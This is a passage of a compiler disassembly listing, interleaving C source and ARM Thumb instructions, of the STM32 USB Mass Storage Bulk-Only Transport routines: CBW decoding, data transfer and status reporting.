 800932a:	33b0      	adds	r3, #176	; 0xb0
 800932c:	009b      	lsls	r3, r3, #2
 800932e:	4413      	add	r3, r2
 8009330:	685b      	ldr	r3, [r3, #4]
 8009332:	681b      	ldr	r3, [r3, #0]
 8009334:	2000      	movs	r0, #0
 8009336:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 8009338:	4b0d      	ldr	r3, [pc, #52]	; (8009370 <MSC_BOT_Init+0x9c>)
 800933a:	781b      	ldrb	r3, [r3, #0]
 800933c:	4619      	mov	r1, r3
 800933e:	6878      	ldr	r0, [r7, #4]
 8009340:	f003 fc8a 	bl	800cc58 <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 8009344:	4b0b      	ldr	r3, [pc, #44]	; (8009374 <MSC_BOT_Init+0xa0>)
 8009346:	781b      	ldrb	r3, [r3, #0]
 8009348:	4619      	mov	r1, r3
 800934a:	6878      	ldr	r0, [r7, #4]
 800934c:	f003 fc84 	bl	800cc58 <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009350:	4b07      	ldr	r3, [pc, #28]	; (8009370 <MSC_BOT_Init+0x9c>)
 8009352:	7819      	ldrb	r1, [r3, #0]
 8009354:	68fb      	ldr	r3, [r7, #12]
 8009356:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800935a:	3210      	adds	r2, #16
 800935c:	231f      	movs	r3, #31
 800935e:	6878      	ldr	r0, [r7, #4]
 8009360:	f003 fdb8 	bl	800ced4 <USBD_LL_PrepareReceive>
 8009364:	e000      	b.n	8009368 <MSC_BOT_Init+0x94>
    return;
 8009366:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009368:	3710      	adds	r7, #16
 800936a:	46bd      	mov	sp, r7
 800936c:	bd80      	pop	{r7, pc}
 800936e:	bf00      	nop
 8009370:	2000010b 	.word	0x2000010b
 8009374:	2000010a 	.word	0x2000010a

08009378 <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 8009378:	b580      	push	{r7, lr}
 800937a:	b084      	sub	sp, #16
 800937c:	af00      	add	r7, sp, #0
 800937e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009380:	687b      	ldr	r3, [r7, #4]
 8009382:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009386:	687b      	ldr	r3, [r7, #4]
 8009388:	32b0      	adds	r2, #176	; 0xb0
 800938a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800938e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009390:	68fb      	ldr	r3, [r7, #12]
 8009392:	2b00      	cmp	r3, #0
 8009394:	d01c      	beq.n	80093d0 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 8009396:	68fb      	ldr	r3, [r7, #12]
 8009398:	2200      	movs	r2, #0
 800939a:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 800939c:	68fb      	ldr	r3, [r7, #12]
 800939e:	2201      	movs	r2, #1
 80093a0:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 80093a2:	4b0d      	ldr	r3, [pc, #52]	; (80093d8 <MSC_BOT_Reset+0x60>)
 80093a4:	781b      	ldrb	r3, [r3, #0]
 80093a6:	4619      	mov	r1, r3
 80093a8:	6878      	ldr	r0, [r7, #4]
 80093aa:	f003 fcc1 	bl	800cd30 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 80093ae:	4b0b      	ldr	r3, [pc, #44]	; (80093dc <MSC_BOT_Reset+0x64>)
 80093b0:	781b      	ldrb	r3, [r3, #0]
 80093b2:	4619      	mov	r1, r3
 80093b4:	6878      	ldr	r0, [r7, #4]
 80093b6:	f003 fcbb 	bl	800cd30 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80093ba:	4b08      	ldr	r3, [pc, #32]	; (80093dc <MSC_BOT_Reset+0x64>)
 80093bc:	7819      	ldrb	r1, [r3, #0]
 80093be:	68fb      	ldr	r3, [r7, #12]
 80093c0:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80093c4:	3210      	adds	r2, #16
 80093c6:	231f      	movs	r3, #31
 80093c8:	6878      	ldr	r0, [r7, #4]
 80093ca:	f003 fd83 	bl	800ced4 <USBD_LL_PrepareReceive>
 80093ce:	e000      	b.n	80093d2 <MSC_BOT_Reset+0x5a>
    return;
 80093d0:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80093d2:	3710      	adds	r7, #16
 80093d4:	46bd      	mov	sp, r7
 80093d6:	bd80      	pop	{r7, pc}
 80093d8:	2000010a 	.word	0x2000010a
 80093dc:	2000010b 	.word	0x2000010b

080093e0 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 80093e0:	b480      	push	{r7}
 80093e2:	b085      	sub	sp, #20
 80093e4:	af00      	add	r7, sp, #0
 80093e6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80093e8:	687b      	ldr	r3, [r7, #4]
 80093ea:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80093ee:	687b      	ldr	r3, [r7, #4]
 80093f0:	32b0      	adds	r2, #176	; 0xb0
 80093f2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093f6:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 80093f8:	68fb      	ldr	r3, [r7, #12]
 80093fa:	2b00      	cmp	r3, #0
 80093fc:	d002      	beq.n	8009404 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 80093fe:	68fb      	ldr	r3, [r7, #12]
 8009400:	2200      	movs	r2, #0
 8009402:	721a      	strb	r2, [r3, #8]
  }
}
 8009404:	bf00      	nop
 8009406:	3714      	adds	r7, #20
 8009408:	46bd      	mov	sp, r7
 800940a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800940e:	4770      	bx	lr

08009410 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009410:	b580      	push	{r7, lr}
 8009412:	b084      	sub	sp, #16
 8009414:	af00      	add	r7, sp, #0
 8009416:	6078      	str	r0, [r7, #4]
 8009418:	460b      	mov	r3, r1
 800941a:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800941c:	687b      	ldr	r3, [r7, #4]
 800941e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009422:	687b      	ldr	r3, [r7, #4]
 8009424:	32b0      	adds	r2, #176	; 0xb0
 8009426:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800942a:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800942c:	68fb      	ldr	r3, [r7, #12]
 800942e:	2b00      	cmp	r3, #0
 8009430:	d022      	beq.n	8009478 <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009432:	68fb      	ldr	r3, [r7, #12]
 8009434:	7a1b      	ldrb	r3, [r3, #8]
 8009436:	2b02      	cmp	r3, #2
 8009438:	d005      	beq.n	8009446 <MSC_BOT_DataIn+0x36>
 800943a:	2b02      	cmp	r3, #2
 800943c:	db1e      	blt.n	800947c <MSC_BOT_DataIn+0x6c>
 800943e:	3b03      	subs	r3, #3
 8009440:	2b01      	cmp	r3, #1
 8009442:	d81b      	bhi.n	800947c <MSC_BOT_DataIn+0x6c>
 8009444:	e013      	b.n	800946e <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009446:	68fb      	ldr	r3, [r7, #12]
 8009448:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800944c:	7f59      	ldrb	r1, [r3, #29]
 800944e:	68fb      	ldr	r3, [r7, #12]
 8009450:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009454:	331f      	adds	r3, #31
 8009456:	461a      	mov	r2, r3
 8009458:	6878      	ldr	r0, [r7, #4]
 800945a:	f000 f9e5 	bl	8009828 <SCSI_ProcessCmd>
 800945e:	4603      	mov	r3, r0
 8009460:	2b00      	cmp	r3, #0
 8009462:	da0d      	bge.n	8009480 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009464:	2101      	movs	r1, #1
 8009466:	6878      	ldr	r0, [r7, #4]
 8009468:	f000 f920 	bl	80096ac <MSC_BOT_SendCSW>
      }
      break;
 800946c:	e008      	b.n	8009480 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800946e:	2100      	movs	r1, #0
 8009470:	6878      	ldr	r0, [r7, #4]
 8009472:	f000 f91b 	bl	80096ac <MSC_BOT_SendCSW>
      break;
 8009476:	e004      	b.n	8009482 <MSC_BOT_DataIn+0x72>
    return;
 8009478:	bf00      	nop
 800947a:	e002      	b.n	8009482 <MSC_BOT_DataIn+0x72>

    default:
      break;
 800947c:	bf00      	nop
 800947e:	e000      	b.n	8009482 <MSC_BOT_DataIn+0x72>
      break;
 8009480:	bf00      	nop
  }
}
 8009482:	3710      	adds	r7, #16
 8009484:	46bd      	mov	sp, r7
 8009486:	bd80      	pop	{r7, pc}

08009488 <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009488:	b580      	push	{r7, lr}
 800948a:	b084      	sub	sp, #16
 800948c:	af00      	add	r7, sp, #0
 800948e:	6078      	str	r0, [r7, #4]
 8009490:	460b      	mov	r3, r1
 8009492:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009494:	687b      	ldr	r3, [r7, #4]
 8009496:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800949a:	687b      	ldr	r3, [r7, #4]
 800949c:	32b0      	adds	r2, #176	; 0xb0
 800949e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80094a2:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80094a4:	68fb      	ldr	r3, [r7, #12]
 80094a6:	2b00      	cmp	r3, #0
 80094a8:	d01e      	beq.n	80094e8 <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 80094aa:	68fb      	ldr	r3, [r7, #12]
 80094ac:	7a1b      	ldrb	r3, [r3, #8]
 80094ae:	2b00      	cmp	r3, #0
 80094b0:	d002      	beq.n	80094b8 <MSC_BOT_DataOut+0x30>
 80094b2:	2b01      	cmp	r3, #1
 80094b4:	d004      	beq.n	80094c0 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 80094b6:	e01a      	b.n	80094ee <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 80094b8:	6878      	ldr	r0, [r7, #4]
 80094ba:	f000 f81b 	bl	80094f4 <MSC_BOT_CBW_Decode>
      break;
 80094be:	e016      	b.n	80094ee <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80094c0:	68fb      	ldr	r3, [r7, #12]
 80094c2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094c6:	7f59      	ldrb	r1, [r3, #29]
 80094c8:	68fb      	ldr	r3, [r7, #12]
 80094ca:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ce:	331f      	adds	r3, #31
 80094d0:	461a      	mov	r2, r3
 80094d2:	6878      	ldr	r0, [r7, #4]
 80094d4:	f000 f9a8 	bl	8009828 <SCSI_ProcessCmd>
 80094d8:	4603      	mov	r3, r0
 80094da:	2b00      	cmp	r3, #0
 80094dc:	da06      	bge.n	80094ec <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80094de:	2101      	movs	r1, #1
 80094e0:	6878      	ldr	r0, [r7, #4]
 80094e2:	f000 f8e3 	bl	80096ac <MSC_BOT_SendCSW>
      break;
 80094e6:	e001      	b.n	80094ec <MSC_BOT_DataOut+0x64>
    return;
 80094e8:	bf00      	nop
 80094ea:	e000      	b.n	80094ee <MSC_BOT_DataOut+0x66>
      break;
 80094ec:	bf00      	nop
  }
}
 80094ee:	3710      	adds	r7, #16
 80094f0:	46bd      	mov	sp, r7
 80094f2:	bd80      	pop	{r7, pc}

080094f4 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 80094f4:	b580      	push	{r7, lr}
 80094f6:	b084      	sub	sp, #16
 80094f8:	af00      	add	r7, sp, #0
 80094fa:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80094fc:	687b      	ldr	r3, [r7, #4]
 80094fe:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009502:	687b      	ldr	r3, [r7, #4]
 8009504:	32b0      	adds	r2, #176	; 0xb0
 8009506:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800950a:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 800950c:	68fb      	ldr	r3, [r7, #12]
 800950e:	2b00      	cmp	r3, #0
 8009510:	f000 8085 	beq.w	800961e <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009514:	68fb      	ldr	r3, [r7, #12]
 8009516:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800951a:	695b      	ldr	r3, [r3, #20]
 800951c:	68fa      	ldr	r2, [r7, #12]
 800951e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009522:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 8009524:	68fb      	ldr	r3, [r7, #12]
 8009526:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800952a:	699b      	ldr	r3, [r3, #24]
 800952c:	68fa      	ldr	r2, [r7, #12]
 800952e:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009532:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009534:	4b3d      	ldr	r3, [pc, #244]	; (800962c <MSC_BOT_CBW_Decode+0x138>)
 8009536:	781b      	ldrb	r3, [r3, #0]
 8009538:	4619      	mov	r1, r3
 800953a:	6878      	ldr	r0, [r7, #4]
 800953c:	f003 fd02 	bl	800cf44 <USBD_LL_GetRxDataSize>
 8009540:	4603      	mov	r3, r0
 8009542:	2b1f      	cmp	r3, #31
 8009544:	d118      	bne.n	8009578 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009546:	68fb      	ldr	r3, [r7, #12]
 8009548:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800954c:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 800954e:	4a38      	ldr	r2, [pc, #224]	; (8009630 <MSC_BOT_CBW_Decode+0x13c>)
 8009550:	4293      	cmp	r3, r2
 8009552:	d111      	bne.n	8009578 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009554:	68fb      	ldr	r3, [r7, #12]
 8009556:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800955a:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 800955c:	2b01      	cmp	r3, #1
 800955e:	d80b      	bhi.n	8009578 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009560:	68fb      	ldr	r3, [r7, #12]
 8009562:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009566:	7f9b      	ldrb	r3, [r3, #30]
 8009568:	2b00      	cmp	r3, #0
 800956a:	d005      	beq.n	8009578 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 800956c:	68fb      	ldr	r3, [r7, #12]
 800956e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009572:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009574:	2b10      	cmp	r3, #16
 8009576:	d90f      	bls.n	8009598 <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009578:	68fb      	ldr	r3, [r7, #12]
 800957a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800957e:	7f59      	ldrb	r1, [r3, #29]
 8009580:	2320      	movs	r3, #32
 8009582:	2205      	movs	r2, #5
 8009584:	6878      	ldr	r0, [r7, #4]
 8009586:	f000 fe7b 	bl	800a280 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 800958a:	68fb      	ldr	r3, [r7, #12]
 800958c:	2202      	movs	r2, #2
 800958e:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009590:	6878      	ldr	r0, [r7, #4]
 8009592:	f000 f8cb 	bl	800972c <MSC_BOT_Abort>
 8009596:	e045      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009598:	68fb      	ldr	r3, [r7, #12]
 800959a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800959e:	7f59      	ldrb	r1, [r3, #29]
 80095a0:	68fb      	ldr	r3, [r7, #12]
 80095a2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095a6:	331f      	adds	r3, #31
 80095a8:	461a      	mov	r2, r3
 80095aa:	6878      	ldr	r0, [r7, #4]
 80095ac:	f000 f93c 	bl	8009828 <SCSI_ProcessCmd>
 80095b0:	4603      	mov	r3, r0
 80095b2:	2b00      	cmp	r3, #0
 80095b4:	da0c      	bge.n	80095d0 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 80095b6:	68fb      	ldr	r3, [r7, #12]
 80095b8:	7a1b      	ldrb	r3, [r3, #8]
 80095ba:	2b05      	cmp	r3, #5
 80095bc:	d104      	bne.n	80095c8 <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80095be:	2101      	movs	r1, #1
 80095c0:	6878      	ldr	r0, [r7, #4]
 80095c2:	f000 f873 	bl	80096ac <MSC_BOT_SendCSW>
 80095c6:	e02d      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80095c8:	6878      	ldr	r0, [r7, #4]
 80095ca:	f000 f8af 	bl	800972c <MSC_BOT_Abort>
 80095ce:	e029      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80095d0:	68fb      	ldr	r3, [r7, #12]
 80095d2:	7a1b      	ldrb	r3, [r3, #8]
 80095d4:	2b02      	cmp	r3, #2
 80095d6:	d024      	beq.n	8009622 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80095d8:	68fb      	ldr	r3, [r7, #12]
 80095da:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80095dc:	2b01      	cmp	r3, #1
 80095de:	d020      	beq.n	8009622 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 80095e0:	68fb      	ldr	r3, [r7, #12]
 80095e2:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80095e4:	2b03      	cmp	r3, #3
 80095e6:	d01c      	beq.n	8009622 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 80095e8:	68fb      	ldr	r3, [r7, #12]
 80095ea:	68db      	ldr	r3, [r3, #12]
 80095ec:	2b00      	cmp	r3, #0
 80095ee:	d009      	beq.n	8009604 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 80095f0:	68fb      	ldr	r3, [r7, #12]
 80095f2:	f103 0110 	add.w	r1, r3, #16
 80095f6:	68fb      	ldr	r3, [r7, #12]
 80095f8:	68db      	ldr	r3, [r3, #12]
 80095fa:	461a      	mov	r2, r3
 80095fc:	6878      	ldr	r0, [r7, #4]
 80095fe:	f000 f819 	bl	8009634 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 8009602:	e00f      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 8009604:	68fb      	ldr	r3, [r7, #12]
 8009606:	68db      	ldr	r3, [r3, #12]
 8009608:	2b00      	cmp	r3, #0
 800960a:	d104      	bne.n	8009616 <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800960c:	2100      	movs	r1, #0
 800960e:	6878      	ldr	r0, [r7, #4]
 8009610:	f000 f84c 	bl	80096ac <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009614:	e006      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009616:	6878      	ldr	r0, [r7, #4]
 8009618:	f000 f888 	bl	800972c <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 800961c:	e002      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
    return;
 800961e:	bf00      	nop
 8009620:	e000      	b.n	8009624 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 8009622:	bf00      	nop
    }
  }
}
 8009624:	3710      	adds	r7, #16
 8009626:	46bd      	mov	sp, r7
 8009628:	bd80      	pop	{r7, pc}
 800962a:	bf00      	nop
 800962c:	2000010b 	.word	0x2000010b
 8009630:	43425355 	.word	0x43425355

08009634 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 8009634:	b580      	push	{r7, lr}
 8009636:	b086      	sub	sp, #24
 8009638:	af00      	add	r7, sp, #0
 800963a:	60f8      	str	r0, [r7, #12]
 800963c:	60b9      	str	r1, [r7, #8]
 800963e:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009640:	68fb      	ldr	r3, [r7, #12]
 8009642:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009646:	68fb      	ldr	r3, [r7, #12]
 8009648:	32b0      	adds	r2, #176	; 0xb0
 800964a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800964e:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009650:	697b      	ldr	r3, [r7, #20]
 8009652:	2b00      	cmp	r3, #0
 8009654:	d023      	beq.n	800969e <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 8009656:	697b      	ldr	r3, [r7, #20]
 8009658:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800965c:	699b      	ldr	r3, [r3, #24]
 800965e:	687a      	ldr	r2, [r7, #4]
 8009660:	4293      	cmp	r3, r2
 8009662:	bf28      	it	cs
 8009664:	4613      	movcs	r3, r2
 8009666:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 8009668:	697b      	ldr	r3, [r7, #20]
 800966a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800966e:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8009670:	687b      	ldr	r3, [r7, #4]
 8009672:	1ad3      	subs	r3, r2, r3
 8009674:	697a      	ldr	r2, [r7, #20]
 8009676:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800967a:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 800967c:	697b      	ldr	r3, [r7, #20]
 800967e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009682:	2200      	movs	r2, #0
 8009684:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 8009688:	697b      	ldr	r3, [r7, #20]
 800968a:	2204      	movs	r2, #4
 800968c:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 800968e:	4b06      	ldr	r3, [pc, #24]	; (80096a8 <MSC_BOT_SendData+0x74>)
 8009690:	7819      	ldrb	r1, [r3, #0]
 8009692:	693b      	ldr	r3, [r7, #16]
 8009694:	68ba      	ldr	r2, [r7, #8]
 8009696:	68f8      	ldr	r0, [r7, #12]
 8009698:	f003 fbe4 	bl	800ce64 <USBD_LL_Transmit>
 800969c:	e000      	b.n	80096a0 <MSC_BOT_SendData+0x6c>
    return;
 800969e:	bf00      	nop
}
 80096a0:	3718      	adds	r7, #24
 80096a2:	46bd      	mov	sp, r7
 80096a4:	bd80      	pop	{r7, pc}
 80096a6:	bf00      	nop
 80096a8:	2000010a 	.word	0x2000010a

080096ac <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 80096ac:	b580      	push	{r7, lr}
 80096ae:	b084      	sub	sp, #16
 80096b0:	af00      	add	r7, sp, #0
 80096b2:	6078      	str	r0, [r7, #4]
 80096b4:	460b      	mov	r3, r1
 80096b6:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096b8:	687b      	ldr	r3, [r7, #4]
 80096ba:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096be:	687b      	ldr	r3, [r7, #4]
 80096c0:	32b0      	adds	r2, #176	; 0xb0
 80096c2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096c6:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
